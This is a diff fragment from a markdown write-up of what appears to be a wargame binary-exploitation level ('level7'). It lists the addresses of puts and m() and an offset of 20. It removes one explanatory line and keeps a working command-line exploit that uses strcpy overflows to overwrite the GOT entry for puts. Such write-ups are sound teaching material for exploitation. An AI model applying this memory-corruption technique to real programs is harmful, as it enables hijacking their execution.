@@ -40,7 +40,6 @@ We need addr of `m()`, `puts()` and `the offset for puVar1[1]`
 * puts addr => 0x08049928
 * offset is 20
 
-since the second strcpy add argv[2] to argv[1] we can do this
 
 ```
 $ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
